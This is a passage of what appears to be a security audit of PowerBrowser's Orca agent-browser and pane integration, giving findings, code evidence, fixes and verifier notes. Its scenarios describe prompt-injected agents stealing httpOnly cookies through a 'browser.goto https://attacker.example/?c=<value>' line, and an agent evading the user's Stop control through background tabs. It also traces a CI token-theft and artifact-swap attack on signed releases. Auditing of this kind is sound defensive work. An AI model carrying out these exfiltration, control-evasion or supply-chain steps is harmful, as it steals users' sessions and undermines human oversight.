**Verifier (PLAUSIBLE, medium).** The architecture is as described. groupSenderIsTheia (PowerBrowserAPI.sys.mjs:319-349) authenticates a document: the shell's content browser, the sidecar port and the Theia spec. PowerBrowserGroupParent.receiveMessage (4545-4557) routes the shell, store, web-tab action and group mutation kinds after that check, and readClipboardText (4701-4702) returns the clipboard with no further check. OrcaPaneBundle.loadEntry (orca-pane-bundle.ts:122-147) imports Orca's renderer bundle into that same Theia document through an inline module script. I found no Content-Security-Policy in theia/extensions, and the inline loader itself implies none forbids inline script. Any script running in Orca's views therefore holds every privileged kind. The step I cannot settle statically is whether Orca's renderer at the pinned tag has an HTML or script injection flaw that agent or repository content can reach. The finding assumes one and does not demonstrate it. The owner accepted T-64-12 ('Orca code in the authenticated document', medium, accept; 64-02-PLAN.md:312), and T-61-04 is still open. That acceptance does not refute the finding.

*Checked at:* Unverified runtime step: an injection flaw in Orca's renderer (chat, terminal or repository views). No CSP was found in theia/extensions, so no guard blocks injected script once such a flaw exists.

### agent-browser-02: An agent tab recreated after a crash or lost view reopens without the agent flag, in the user's cookie jar and outside every agent wall

- **Severity:** medium (reported as high)
- **Verdict:** CONFIRMED
- **Location:** `theia/extensions/tab-uris/src/browser/web-tab.ts:1304`
- **Category:** privilege-boundary

**What is wrong.** WebTabWidget sends the agent flag only on the first webTabOpen (agentOpenSent). recreate() for a crashed tab and reopen() for a lost view both call webTabClose and then webTabOpen without `agent`. Chrome treats that as a new overlay with agent=false. The new overlay is in the 'browsers' message manager group (login manager and autocomplete attached), uses the user's default container (no usercontextid), and has neither SANDBOXED_AUXILIARY_NAVIGATION nor SANDBOXED_DOWNLOADS. It gets no protocol or clipboard wall. Chrome keeps the crashed tab's session history and restores it, so the agent's page (possibly hostile) loads again in the user's logged-in context. The Theia page table still binds the tab to the Orca page, so reportMetadata keeps sending the user's later URLs and titles in that tab to orcad.

**Scenario.** A hostile page that an agent opened allocates memory until its content process crashes. The user (or anything else) presses Reload, Back or Forward on the crashed agent tab. web-tab.ts reload() -> recreate() -> reopen() sends {kind:'webTabOpen', tabId, url, key} with no agent field. PowerBrowserAPI.webTabOpen creates a plain overlay in container 0, and restoreWebTabHistory reloads the hostile URL. The page now runs with the user's cookies (credentialed requests, login autofill) and may open popups, downloads and external protocols that D-35, D-37 and D-38 refuse for agent pages. Its URL and title changes reach orcad and the agent through pageMetadata.

**Preconditions.** An agent tab's content process crashes (a page can force this by exhausting memory), or its view is lost, and then Reload, Back, Forward or a history jump runs on it.

**Evidence.** web-tab.ts:984-986 `const agent = this.agent && !this.agentOpenSent; this.agentOpenSent = true; ... ...(agent ? { agent: true as const } : {})`; web-tab.ts:1294-1305 `protected async recreate() { await this.channel.request({ kind: 'webTabClose', ... }); return this.reopen(); } ... reopen() { const reply = await this.channel.request({ kind: 'webTabOpen', tabId: this.tabId, url: this.url, key: this.rowKey });`; PowerBrowserAPI.sys.mjs:3577 `webTabOpen(..., pending = null, agent = false)`, :3592 `const userContextId = agent === true ? agentContainerId() : 0;`, :3632-3634 `if (agent === true) { agentTabCreated(entry, userContextId); }`, :3640-3654 history restore; orca-browser-frontend-module.ts:441-451 reportMetadata for any bound tabId.

**Suggested fix.** Make the agent flag a property of the tab id in chrome: record agent tab ids in a set that webTabClose does not clear, and have webTabOpen apply agentTabCreated whenever the id is in that set, whatever the frontend sends. Also pass `agent: this.agent` from reopen(). Otherwise refuse recreate and reopen for agent widgets (close the tab and report a user close).

**Verifier (CONFIRMED, medium).** I traced the path myself and it is as described.

Frontend side:
- web-tab.ts:984-986 sends `agent: true` only while `agentOpenSent` is false, and sets it true on the first attach.
- reopen() at web-tab.ts:1304-1305 sends `{kind:'webTabOpen', tabId, url, key}` and never carries `agent`.
- recreate() (1294-1297) sends webTabClose and then calls reopen().
- Five actions reach recreate() on a crashed tab: navigate (1216), back (1225), forward (1232), gotoIndex (1255) and reload (1272). Reload on a lost view goes straight to reopen() (1269-1270, 1281-1282).
- The crash UI tells the user to do this: CRASHED_COPY at web-tab.ts:74 reads "This tab crashed. Reload to try again."

Chrome side:
- webTabClose (PowerBrowserAPI.sys.mjs:4225-4277) keeps the crashed tab's history armed under its rowKey (4234-4235, keepCrashedWebTabHistory at 846-857) and then runs webTabs.delete(tabId). webTabOpen's "already-open" branch (3582) therefore does not fire.
- The handler at 2797-2802 passes `data.agent === true`, which is false here. So userContextId is 0 (3588), the agent attribute override at 3620 is not applied (messagemanagergroup "browsers", PopupAutoComplete), and agentTabCreated is skipped (3655-3657). That skip means no SANDBOXED_AUXILIARY_NAVIGATION or SANDBOXED_DOWNLOADS (11273), and no protocol wall or focus guard install.
- rowKey always exists (web-tab.ts:883; chrome 3699), so takeWebTabHistory (3662) returns the kept history. restoreWebTabHistory (3664) reloads the current entry. If the restore rejects, the code falls back to webTabNavigate(tabId, spec), and spec is this.url, which tracks the page's URL through the state push at web-tab.ts:1565. Either way the hostile URL loads in container 0.
- One step depends on runtime behaviour: whether restoring entries whose serialized triggering principals carry the agent container's userContextId into a container-0 docshell loads cleanly or silently loads nothing. Both of the code's own branches send the URL into the default container.

What gates the open:
- The frontend only checks tabId shape, key shape and that the agent flag is true or absent. No guard re-derives agent status for a reused tabId or rowKey.
- closeStaleAgentTabs (orca-browser-frontend-module.ts:432-438) only runs for widgets whose page is unbound. Here the tab is still bound, so reportMetadata (441-451) keeps sending the tab's later url and title to orcad as pageMetadata.

Preconditions:
- A page can plausibly crash its own content process by exhausting memory.
- The user then has to press Reload, Back or Forward, or type a URL. The crash UI invites exactly that.
- None of this requires already holding the capability gained.

Why medium and not high:
- The page now runs as an ordinary page in the user's default container. A hostile origin gets its own cookies, its own saved-login autofill, popups, downloads and protocol prompts. Any site the user visits directly gets the same.
- So the crossing is the loss of the Orca agent isolation walls (P66-26 container, D-35, D-37 and the protocol wall), not a new capability over other origins.
- Agent control is lost too: agentWallVerdict at 11206 refuses the new entry because entry.agent is not true. The agent cannot drive the page in the user's context.
- What leaks is privacy: the user's later URLs and titles in that tab go to orcad and the agent.
- That is a defence-in-depth gap with a concrete path, plus a user-visible correctness bug: an agent tab silently becomes a user tab.

*Checked at:* theia/extensions/tab-uris/src/browser/web-tab.ts:984-986 (flag only on first open) and :1305 (reopen sends no agent); powerbrowser/shell/PowerBrowserAPI.sys.mjs:4275 (webTabs.delete makes the reopen a fresh create), :3588 (userContextId 0 when agent false), :3620 (agent attribute override skipped), :3655-3657 (agentTabCreated skipped, so no sandbox flags from :11273), :3662-3674 (kept history restored or URL navigated in container 0); orca-browser-frontend-module.ts:441-451 (metadata still reported for the bound tabId)

### agent-browser-03: All agents share one persistent container, and cookie.get returns httpOnly session cookies of any host

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `powerbrowser/shell/PowerBrowserAPI.sys.mjs:11488`
- **Category:** secret-exposure

**What is wrong.** agentContainerId creates one 'PowerBrowser Orca agents' container and reuses it for every agent tab of every worktree and session. Its cookies persist across launches. browser.cookie.get with no url returns every cookie in that container, and with a url returns that host's cookies, including httpOnly ones, with their values. browser.cookie.set accepts any domain. A session the user logs into in an agent tab (for example when an agent asks them to sign in), or that another agent established, is therefore readable and replaceable by any later agent that a page prompt-injects. The agent can then send the values off the machine with browser.goto or browser.eval.

**Scenario.** The user signs in to a code-hosting site in an agent tab so agent A can work there. Days later agent B, in another worktree, reads a hostile page that tells it to run `browser cookie get`. handleWebTabAgent -> agentCookieGet -> getCookiesWithOriginAttributes('{"userContextId":N}') returns the session cookie value with httpOnly:true. The agent then runs browser.goto https://attacker.example/?c=<value>, and the attacker takes over the session.

**Preconditions.** A session cookie exists in the agent container (a user sign-in in an agent tab, or one made by an earlier agent), and an agent is prompt-injected.

**Evidence.** PowerBrowserAPI.sys.mjs:11252-11260 `const stored = Services.prefs.getIntPref(AGENT_CONTAINER_PREF, 0); if (stored > 0 && ...) return stored; const identity = lazy.ContextualIdentityService.create("PowerBrowser Orca agents", ...)`; :11488-11490 `const cookies = host ? Services.cookies.getCookiesFromHost(host, attrs) : Services.cookies.getCookiesWithOriginAttributes(JSON.stringify(attrs)); return agentDone({ cookies: cookies.map(c => ({ name: c.name, value: c.value, ... httpOnly: c.isHttpOnly ...`; :11495 `const host = params.domain || agentHostOf(entry, null);`.

**Suggested fix.** Scope cookie rows to the current page's site (refuse a url or domain that is not the tab's current base domain), or leave out httpOnly values. Consider one container per worktree or per page that is cleared when the page closes, and tell the user that sign-ins made in agent tabs are kept and shared across agents.

**Verifier (CONFIRMED, medium).** agentContainerId (PowerBrowserAPI.sys.mjs:11252-11265) reads the stored id from the pref powerbrowser.orca.agentUserContextId and reuses it whenever ContextualIdentityService still knows it. A new container is made only when the user removes the old one. webTabOpen (:3588) calls it for every agent tab, so every agent of every worktree and every launch shares one cookie jar. No code clears that jar at quit or at start: a grep finds no removeCookiesWithOriginAttributes or removeIdentity for it. agentCookieGet (:11482-11492) takes any params.url, so the host is the agent's choice and need not be the current page. It returns every cookie in the container when url is absent, and it maps value and httpOnly through unfiltered. agentCookieSet (:11494-11505) passes params.domain straight to Services.cookies.add. The validator (:11158-11159) checks only the types. The wall (agentWallVerdict :11202) checks owner, the agent flag and the container, and none of those limit which hosts' cookies come back. browser.goto passes any https URL (:11624 -> webTabNavigate :4147), so the stolen value can leave the machine through a query string. The user can sign in to a site inside an agent tab, because it is an ordinary visible web tab. Point (4): a prompt-injected agent could already act inside the session while it runs, but it could not read an httpOnly value with page script. Taking that value off the machine gives the attacker persistent access with no agent involved, so the precondition does not already grant what is gained. Upstream Orca derives a per-route partition (orca/src/main/browser/browser-route-identity.ts:39), so PB's single shared jar is wider than upstream. No owner decision accepts this. D-41 accepts other agent-tab risks only.

*Checked at:* PowerBrowserAPI.sys.mjs:11254-11256 reuses the stored container. :11484-11490 returns any host's cookies, httpOnly included, with values. :11495 uses the caller's domain. :4147 checks only the scheme for the exfiltration goto. No guard found.

### agent-browser-04: Stop ends control of one tab only; the agent keeps acting through new background tabs, and Stop is hidden while the mark is idle

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `powerbrowser/shell/PowerBrowserAPI.sys.mjs:11811`
- **Category:** user-control

**What is wrong.** handleWebTabAgentStop sets stopped on one webTabs entry. The Theia dispatcher keeps no stopped state, so the next createPage from orcad (browser.tabCreate / openUrl) opens a new agent tab in the background through openAgentTab, and every automation method works there. The chrome bar shows the mark and its Stop button only while agentControl.active is true. That flag is lit by a served automation call and clears after 20 s idle. It is never lit by the `navigate` page command, which loads the agent's chosen URL in the new tab. So the user cannot stop an agent before it acts, and Stop does not stop the agent.

**Scenario.** The user sees the mark on tab A and presses Stop. Agent calls on A now answer browser_owner_unavailable. The prompt-injected agent runs `orca browser tab create --url https://target`. orcad sends createPage then navigate. dispatchCommand opens tab B behind the user's current tab and navigates it, with no mark lit, and then drives B with click and fill. The user sees B's mark only by switching to B.

**Preconditions.** An agent keeps running after the user presses Stop, as a prompt-injected agent will.

**Evidence.** PowerBrowserAPI.sys.mjs:11809-11811 `const control = agentControlOf(entry); const wasStopped = control.stopped; control.stopped = true;` (per entry); orca-browser-dispatch.ts:123-133 createPage opens a tab whatever the state of other tabs; orca-browser-frontend-module.ts:374-382 openAgentTab; web-tab.ts:1817-1820 `openAgentTab ... Never activated`; chrome-bar-widget.tsx:1687-1689 `if (!currentWebTab()?.agentControl.active) { return undefined; }`; orca-browser-dispatch.ts:148-150 navigate goes to webTabNavigate, which never calls agentSetActive.

**Suggested fix.** Make Stop end the browser host for that agent or worktree: record the stop in OrcaBrowserHost (by workspaceId, or for the whole host), refuse later createPage, navigate and automation with browser_owner_unavailable until the user resumes, and show the mark whenever a tab is an agent tab, not only while active.

**Verifier (CONFIRMED, medium).** handleWebTabAgentStop (PowerBrowserAPI.sys.mjs:11797-11827) sets stopped on that one entry's agentControl only. agentWallVerdict (:11209) consults the flag only for that entry. On the Theia side, dispatchCommand's createPage branch (orca-browser-dispatch.ts:123-133) checks only whether the page id is already bound. No stopped state exists anywhere in the dispatcher or in OrcaBrowserHost.deps (orca-browser-frontend-module.ts:371-392). So a new createPage opens a fresh agent tab through openAgentTab (web-tab.ts:1817-1821), which never activates it, and every automation method works there. The `navigate` page command goes to widget.navigate, then the group mutation webTabNavigate (PowerBrowserAPI.sys.mjs:2816-2820), then webTabNavigate (:4145-4169). None of these calls agentSetActive or checks stopped. So the mark is not lit by the first navigation, and navigate still works even on the tab that was stopped. The mark is lit only by handleWebTabAgent (:11769) and cleared 20 s after the last call (:11695-11698). The chrome bar renders the mark and Stop only for the current tab while active is true (chrome-bar-widget.tsx:1687-1689), so a background tab B has no Stop the user can see. Stop being per-tab is the stated design (P66-22, D-19). No owner decision accepts the risk that Stop does not stop the agent.

*Checked at:* PowerBrowserAPI.sys.mjs:11811 sets stopped per entry only. orca-browser-dispatch.ts:123-133 has no stopped check on createPage. PowerBrowserAPI.sys.mjs:2816-2820 and :4145 have no stopped check on navigate. chrome-bar-widget.tsx:1687 shows the mark only while active.

### overlay-renderer-01: closePane on one terminal split closes each mounted leaf widget's own active pane, not the requested leaf

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `orca-overlay/files/src/renderer/src/pb/pb-pane-mount.tsx:1000`
- **Category:** correctness
- **Owner decision cited:** D-15

**What is wrong.** PowerBrowser flattens an Orca terminal tab with splits into one Lumino widget per leaf (orca-pane-widget.tsx). Each widget mounts its own TerminalPane with the same tabId and a different isolatedPaneKey, and each instance holds a full pane manager for every leaf of the tab. Upstream Orca mounts one TerminalPane per tabId. closePane writes activeLeafId into the store layout and then synchronously dispatches Orca's tab-wide window event. The upstream listener (use-terminal-pane-close-actions.ts:207-217) runs once in every mounted instance with that tabId and closes `manager.getActivePane()`. Nothing copies the store's activeLeafId into a live manager synchronously; the only store-to-manager path is a React effect that runs after a later render. Result: one close request closes up to N panes, and the panes it closes are each instance's current active pane, which can be a sibling leaf instead of the leaf the user closed.

**Scenario.** A user has an Orca terminal tab split into L1 and L2, shown as two PowerBrowser tabs W1 and W2, and last typed in W2, so the managers' active pane is L2. The user clicks the close button on W1. closePane({paneKey: <tab>:L1}) calls setTabLayout(activeLeafId=L1) and requestActiveTerminalPaneClose(tab). Both instances handle the event and request a close of L2, so L2's shell is killed and W1 stays open. If the instances' active panes differ (L1 in W1, L2 in W2), both leaves close. For an idle shell (probe verdict not 'live') the close needs no confirmation, so the user loses the wrong terminal session with no prompt.

**Preconditions.** An Orca terminal tab with two or more splits is hosted as separate PowerBrowser tabs, and the user closes a split other than the one that last had focus in its manager.

**Evidence.** pb-pane-mount.tsx:994-1002:
  const leaf = pick.paneKey.slice(pick.paneKey.indexOf(':') + 1)
  if (leaves.length > 1 && leaves.includes(leaf)) {
    // Orca's split close acts on the active leaf of the mounted pane; make this leaf active first.
    state.setTabLayout?.(tab.entityId, { ...snapshot!, activeLeafId: leaf })
    requestActiveTerminalPaneClose(tab.entityId)

upstream request-active-terminal-pane-close.ts: window.dispatchEvent(new CustomEvent(..., { detail: { tabId } })), and every subscriber with a matching tabId calls closeActivePane.
upstream use-terminal-pane-close-actions.ts:207-217: closeActivePane = () => { const pane = manager?.getActivePane() ?? manager?.getPanes()[0]; if (pane) handleRequestClosePane(pane.id) }; useEffect(() => onActiveTerminalPaneCloseRequest(tabId, closeActivePane), ...)
HostedPaneBody (pb-pane-mount.tsx:928-939) mounts one TerminalPane per leaf widget with the same tabId; orca-pane-widget.tsx:151 notes that "an isolated terminal leaf's root also holds its tab's other leaves' xterms, hidden".
upstream use-terminal-pane-reconciliation.ts:121-128 applies restoredLayout.activeLeafId to the manager only inside an effect.

**Suggested fix.** Do not route a leaf close through the tab-wide active-pane event. Close the leaf directly by its paneKey: resolve its numeric pane id in the instance that owns the isolated leaf (for example, an event carrying the paneKey that only the instance whose isolatedPaneKey matches handles), or call Orca's per-pane close path with that leaf's id. Add a live check that closes a background split and asserts that only that leaf's PTY ends.

**Verifier (CONFIRMED, medium).** I traced the whole path. orca-pane-widget.tsx:158-170 onCloseRequest calls api.closePane({worktreeId, tabId, paneKey}). pb-pane-mount.tsx:994-1002 writes activeLeafId=leaf into the store through setTabLayout, then calls requestActiveTerminalPaneClose(tab.entityId) in the same tick. Upstream request-active-terminal-pane-close.ts dispatches one window CustomEvent carrying only {tabId}. Every TerminalPane mounted with that tabId has a listener (use-terminal-pane-close-actions.ts:207-217), and each listener calls handleRequestClosePane(manager.getActivePane().id) on its own manager. HostedPaneBody (pb-pane-mount.tsx:925-939) mounts one TerminalPane per leaf widget, all with the same tabId; isolatedPaneKey only hides the other leaves, as the widget comment at orca-pane-widget.tsx:151 says. So every instance holds a full manager. The isolation layout effect (use-terminal-pane-reconciliation.ts:144-184 through applyExpandedLayoutTo) never calls setActivePane. The only store-to-manager application of activeLeafId (reconciliation.ts:117-125) runs in a later effect, and only when insertions or removals are non-empty; it returns early at line 79 otherwise. Nothing therefore syncs the active pane before the listeners run. A click or focus inside a pane sets that manager's active pane (pane-manager-pane-creation.ts:79-83), so W2's manager has L2 active after the user types there. W2's listener closes L2. If the probe verdict is not 'live', it closes without a prompt: executeClosePane -> closePaneLocally -> closeWebRuntimeTerminal(ptyId), or the layout-owner path. I found no deduplication or leaf check between the event and the close. Which leaf W1's own instance closes depends on its manager's active pane: L1 or L2, depending on restore and creation order. In either case one close request reaches N managers, and at least W2's closes its own active leaf.

*Checked at:* pb-pane-mount.tsx:1000-1001 (store write, then a synchronous tab-wide event); orca/src/renderer/src/components/terminal-pane/use-terminal-pane-close-actions.ts:207-217 (closes the active pane of each manager); use-terminal-pane-reconciliation.ts:79 (early return skips the activeLeafId apply at 117-125); pane-manager-pane-creation.ts:79-83 (focus sets the active pane in that manager only)

### overlay-renderer-02: CSS scoping pass treats every Tailwind dark: utility as a theme root, so dark-mode utilities never apply in hosted panes

- **Severity:** medium (reported as low)
- **Verdict:** CONFIRMED
- **Location:** `orca-overlay/files/pb-css-scope.mjs:32`
- **Category:** correctness

**What is wrong.** THEME_RE is /^\.(dark|light)(?![\w-])/. In an escaped Tailwind class such as `.dark\:bg-input\/30`, the character after `.dark` is a backslash, which is not in [\w-], so the regex matches. scopeSelector then rewrites the selector as `<whole compound> S`, which selects a pane or portal root that is a descendant of an element carrying the utility class. That never matches, so the utility's declarations are lost. Any custom-property declarations in the same rule are kept on the unscoped original selector. The built pb-panes.css at this commit has about 96 distinct `.dark\:` utilities rewritten this way, for example dark:bg-input/30 on inputs, dark:invert, dark:ring-accent and dark:bg-accent. No Theia or PowerBrowser chrome is restyled, so this is not a scope escape. It is a visible styling defect in dark mode.

**Scenario.** Orca is in dark mode and a hosted Orca Settings page or dialog renders a shadcn Input with `dark:bg-input/30`. The built rule is `.dark\:bg-input\/30:is(.dark :not(...),...) :where([data-pb-orca-pane], body > [data-radix-popper-content-wrapper], body > [data-slot]){background-color:var(--input)}`. It does not match the input, so the input has no dark background. Icons that rely on `dark:invert` show dark-on-dark.

**Preconditions.** Orca's dark theme is active in a hosted pane or portal.

**Evidence.** pb-css-scope.mjs:32: const THEME_RE = /^\.(dark|light)(?![\w-])/
pb-css-scope.mjs:67: if (THEME_RE.test(head)) return [`${head} ${SCOPE}${rest}`.trim()]
Built orca/out/web/assets/pb-panes/pb-panes.css contains:
.dark\:invert:is(.dark :not(...),...) :where([data-pb-orca-pane], ...){filter:var(--tw-blur,) ... var(--tw-invert,) ...}
.dark\:bg-input\/30:is(...) :where([data-pb-orca-pane], ...){background-color:var(--input)}

**Suggested fix.** Exclude an escaped character from the theme match, for example /^\.(dark|light)(?![\w\\-])/, so that `.dark\:x` falls through to the generic `S X, X:where(P)` branch. Add a fixture to orca-pane-css with a `.dark\:bg-x:is(.dark *)` rule that requires the scoped descendant form.

**Verifier (CONFIRMED, medium).** pb-css-scope.mjs:32 THEME_RE /^\.(dark|light)(?![\w-])/ matches the escaped class `.dark\:...` because the character after `.dark` is a backslash. firstCompound treats the space inside `:is(.dark *)` as depth 1, so head is the whole compound. Line 67 then emits `<head> :where(scope roots)`, which only matches a scope root that is a descendant of the element carrying the utility. The built orca/out/web/assets/pb-panes/pb-panes.css contains exactly that: `.dark\:bg-input\/30:is(.dark ...) :where([data-pb-orca-pane], ...){background-color:...}`. It has 125 distinct `.dark\:` rule heads and no correctly scoped `:where(...) .dark\:` form. In the dark:invert pair, the --tw-invert custom property stays on the unscoped selector (lines 112-119 keep custom properties because isRootOrTheme is also true), but the filter declaration lands on the selector that never matches. pb-css-scope.mjs was last changed at 1edc97d6 (2026-11-13), before the Nov 18 build, so the built output reflects the current pass. No styling escapes into Theia. The defect is a visible dark-mode styling bug on inputs and icons. The rubric places a user-visible correctness bug at medium, though it is cosmetic.

*Checked at:* orca-overlay/files/pb-css-scope.mjs:32 and :67; orca/out/web/assets/pb-panes/pb-panes.css contains `.dark\:bg-input\/30:is(.dark :not(...),...) :where([data-pb-orca-pane], body > [data-radix-popper-content-wrapper], body > [data-slot]){background-color:var(--input)}`

### theia-pane-hosting-01: A restored Orca tab cannot be closed while the pane bundle has failed or never finishes booting

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `theia/extensions/orca-panes/src/browser/orca-pane-widget.tsx:159`
- **Category:** correctness

**What is wrong.** onCloseRequest never disposes a hosted (non-page) widget itself. It forwards the close to Orca. When the bundle boot failed (bundle.failed set), it logs and returns. When the boot is still pending (waitForPairing loops forever while orcad has not written the offer), ready() never resolves and the close is dropped. The observer, the only other path that disposes these widgets (disposeFromStore), starts only after ready() resolves. So every Orca tab that Theia's layout restorer recreated stays open and cannot be closed. It is saved into the layout again and comes back at every launch.

**Scenario.** The user had pb-orca:term1 and pb-orca:chat1 open. At the next launch the bundle fails at the identity or load step (for example a bundle/React version drift), or orcad never becomes ready. Theia restores both tabs. The user clicks X, or presses Ctrl+Shift+W (now bound to CLOSE_TAB by this change), on each tab. Nothing happens beyond a console line, and the tabs come back on every relaunch until Orca boots again.

**Preconditions.** The bundle boot fails or orcad never writes the pairing offer, while Theia's stored layout contains hosted Orca tabs.

**Evidence.** orca-pane-widget.tsx:159-171:
  protected override onCloseRequest(_msg: Message): void {
      if (this.tabless) { this.dispose(); return; }
      ...
      if (this.bundle.failed) {
          console.info(`${LOG_PREFIX} Orca ${this.options.kind} pane close not sent: the pane bundle did not boot`);
          return;
      }
      this.bundle.ready().then(api => api.closePane({ worktreeId, tabId, paneKey }))

orca-pane-bundle.ts:102-110: waitForPairing is `for (let wait = 1000; ; ...)` with no exit except an offer. orca-pane-observer.ts:105: `this.bundle.ready().then(api => this.start(api))`, which is the only route to disposeFromStore.

**Suggested fix.** When the bundle has failed, or Orca's store does not hold the pane (closePane finds no unified tab), dispose the widget locally. Also give the pending boot a bound: a close requested while ready() is unresolved past a timeout should dispose the tab. The Orca pane, if it exists, is re-adopted by key on the next list.

**Verifier (CONFIRMED, medium).** orca-pane-widget.tsx:159-171 disposes only tabless (page) widgets. For a hosted widget it returns early when bundle.failed is set, and otherwise chains on bundle.ready(). orca-pane-bundle.ts:66 caches the boot promise in `booting ??=`, and nothing resets it, so after a failed step bundle.failed stays set for the rest of the session. waitForPairing (bundle.ts:102-110) is an unbounded loop that exits only when an offer arrives, so while orcad has written no offer ready() stays pending and closePane is never sent. The only other dispose path is disposeFromStore, called from observer.ts:214 inside start(), and start() runs only after ready() resolves (observer.ts:105). The widget factory (frontend-module.ts:171-178) builds the widget from the replayed options without depending on the bundle, so Theia's layout restorer recreates these tabs, and storeLayout saves them again. Every close route in Theia (X, Close Tab, Close All) ends in onCloseRequest. In the pending-offer case the close does take effect later if orcad recovers, but in the failed-boot case the tab cannot be closed for the whole session and returns at every launch.

*Checked at:* orca-pane-widget.tsx:165-170 (early return when failed, ready() chain otherwise); orca-pane-bundle.ts:66 (cached boot promise, no reset); orca-pane-bundle.ts:102-110 (unbounded poll); orca-pane-observer.ts:105 and :214 (disposeFromStore reachable only after ready()). No guard found.

### theia-pane-hosting-02: An Orca store activation of any origin brings an agent web tab forward and gives it keyboard focus

- **Severity:** medium
- **Verdict:** PLAUSIBLE
- **Location:** `theia/extensions/orca-panes/src/browser/orca-pane-observer.ts:262`
- **Category:** focus-steal
- **Owner decision cited:** D-34

**What is wrong.** revealBrowserTabs runs on every pane list. It calls shell.activateWidget, which moves keyboard focus, for each browser page whose `active` flag went from false to true. The record's `active` is Orca's group activeTabId, so a user click in Orca's sidebar and a change made by an agent through Orca's runtime look the same. Orca exposes browser.tabSwitch, browser.focus and terminal.focus as runtime RPCs to agents. The rest of this extension keeps agent actions from taking focus (P64-10: "an agent opening a pane must not take focus"; D-57). This path is the exception, and the tab it focuses is an agent-controlled page.

**Scenario.** A prompt-injected agent with an Orca browser page switches Orca's active tab to that page, or toggles another tab and back, while the user is typing in a Theia editor or a hosted terminal. The PowerBrowser web tab is activated and receives focus. The user's next keystrokes (a command, a passphrase typed at a terminal prompt) go to a page the agent drives and can read through its own browser tools.

**Preconditions.** An Orca agent can change the paired web client's store activeTabId for a browser row. Whether browser.tabSwitch or browser.focus does this for PB-hosted rows is not settled statically.

**Evidence.** orca-pane-observer.ts:262-264:
  for (const widget of this.browserPages.reveal(browser)) {
      this.shell.activateWidget(widget.id);
  }
orca-browser-dispatch.ts:213: `if (active && previous.get(pageId) === false && table.tabOf(pageId) !== undefined) reveal.push(pageId);`
pb-pane-mount.tsx:828: `active: group?.activeTabId === tab.id`
Compare orca-pane-observer.ts:242: `// Never activated: an agent opening a pane must not take focus (P64-10).`

**Suggested fix.** Reveal without focus: use shell.revealWidget, or activate only when Theia's current focus is already inside the Orca sidebar view that made the selection. Alternatively, have the bundle report whether the activation came from a user gesture in a hosted view and reveal only those.

**Verifier (PLAUSIBLE, medium).** Most of the path checks out. revealBrowserTabs (observer.ts:262-264) calls shell.activateWidget, which moves focus, for each page that createRevealTracker (orca-browser-dispatch.ts:203-216) reports as having turned from inactive to active. The tracker cannot tell a user selection from any other change to the store. An agent controls the input: browser.tabSwitch is a 'workspace'-permission RPC (orca/src/main/runtime/rpc/methods/browser-core.ts:120-125) that takes a page id and focus:true from the caller. For a client-registered page, browser-tab-queries.ts:97-140 calls registry.activatePage and publishSwitchedBrowserSessionTab, which republishes the session tabs and, when focus is true, calls markHeadlessBrowserSessionTabActive with focusesHost (browser-tab-create-publication.ts:158-176). One step cannot be settled statically. That step is whether that republish or focus marker changes the paired pane client's group activeTabId for the row PowerBrowser itself added under D-34 (overlay pb-pane-mount.tsx:828 derives `active` from it). D-34 says 'Selecting the row in Orca's store brings the PowerBrowser web tab forward (P66-09)', so the owner intended reveal on selection. That decision does not separate user selections from agent ones, and it does not accept the agent case.

*Checked at:* Unsettled step: whether Orca's runtime activatePage or the focusesHost marker sets the pane client's store activeTabId for a PB-added browser row (orca/src/main/runtime/browser-tab-create-publication.ts:162-176 through to the paired client). No guard in revealBrowserTabs or createRevealTracker separates an agent-caused activation from a user one.

### ci-supply-chain-01: Orca build jobs in the Release run can replace the release-linux artifact that sign-publish signs, because that artifact has no digest tied to the job that produced it

- **Severity:** medium (reported as high)
- **Verdict:** PLAUSIBLE
- **Location:** `.github/workflows/release.yml:1139`
- **Category:** artifact-integrity

**What is wrong.** v1.7 adds three hosted jobs to release.yml (windows-orca, macos-orca-arm64, macos-orca-x64) that run the pinned upstream Orca build: pnpm run rebuild:node, build:orcad, build:web, Orca's config/scripts, mobile generators and Vite. They run in the same workflow run as sign-publish. sign-publish downloads `release-linux` by name, checks only that the manifest's release_key matches the tree, then signs the MAR with the MAR key and publishes it to the update channel. build-linux exports no digest of release-linux; it outputs only `build`. Code in a hosted job runs as the runner user. It can rewrite the on-disk copy of a later action in its own job (actions/upload-artifact, already downloaded under _work/_actions at job set-up) and so obtain ACTIONS_RUNTIME_TOKEN. That token can delete and upload artifacts of the run. The windows-sidecar job uses a SHA256SUMS digest passed as a job output to defend against exactly this, but the Linux artifact has no such binding. The 'Linux ships alone' ruling and the comment 'a failure here never reaches a Linux job' cover failures only. A Windows or macOS Orca job can still change the Linux bytes silently. The exposure existed before v1.7 through windows-sidecar's Theia build. v1.7 adds three more jobs that build an upstream which moves every week (D-26).

**Scenario.** A compromised Orca tag, or a compromised npm package in Orca's lockfile at that tag, reaches main through the weekly re-pin. On the next Release dispatch, build code running in windows-orca patches _actions/actions/upload-artifact/<sha>/dist/upload/index.js. When that step runs, the patched code takes ACTIONS_RUNTIME_TOKEN and sends it out, or waits with it. After build-linux uploads release-linux, the attacker uses the token to delete it and upload a tarball, MAR and manifest of their own with the correct release_key. The owner approves the release environment, and sign-publish signs and publishes the attacker's MAR. Every installed client then applies it as a valid signed update.

**Preconditions.** Malicious code in the pinned Orca tag or its locked dependencies (actor f), merged by the weekly re-pin. The ACTIONS_RUNTIME_TOKEN has to stay usable until build-linux has uploaded, either because the attacker's job is still running then or because the token works after its job ends.

**Evidence.** release.yml:1138-1142 `- name: Download the release artifacts (untrusted data, copied and signed, never executed)\n uses: actions/download-artifact@... with: name: release-linux` followed by release.yml:1151-1152 (only `jq -r .release_key` is compared) and release.yml:1205 `Sign the complete MAR`. Producer side: release.yml:217-228 uploads release-linux with no digest output (build-linux outputs only `build: ${{ steps.key_gate.outputs.build }}`, line 78). Untrusted code in the same run: release.yml:449-455 (windows-orca `bash scripts/fetch-orca.sh; bash scripts/build-orca.sh`), 2148-2153 and 2263-2268 (macOS). Contrast the windows-sidecar pattern: `sums_sha256` output plus `check-win-sidecar.sh check` (release.yml:353, 910).

